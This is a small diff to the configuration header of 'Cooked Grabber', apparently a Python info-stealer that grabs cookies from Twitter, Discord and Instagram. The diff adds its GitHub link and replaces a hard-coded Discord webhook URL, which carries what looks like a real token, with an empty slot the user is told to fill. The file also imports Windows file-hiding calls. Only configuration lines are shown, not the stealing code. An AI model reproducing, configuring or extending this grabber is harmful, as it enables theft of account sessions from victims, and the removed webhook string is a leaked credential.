@@ -1,6 +1,6 @@
 #python 3.8
 #Cooked Grabber by H4X0R TEAM
-#Github project link : 
+#Github project link : https://github.com/h4x0r-project/CookedGrabber/
 #Devs: Lemon (https://github.com/mouadessalim) ; crashixx (https://github.com/crashixx) 
 #Only for educational purposes
 
@@ -25,7 +25,7 @@ import win32con
 from win32api import SetFileAttributes
 
 #your webhook (you can enter your webhook)
-webhook = "https://discord.com/api/webhooks/959874718519943188/wzNekOS-l6NxStPm5ldbDFHE3bgkaDjnOixbR-na673Jhfx7UBRKbos4pdGeq6ZGL6Cf"
+webhook = ""
 #website selection (do not change for the good functioning of the system)
 website = ['twitter.com', 'discord.com', 'instagram.com']
 
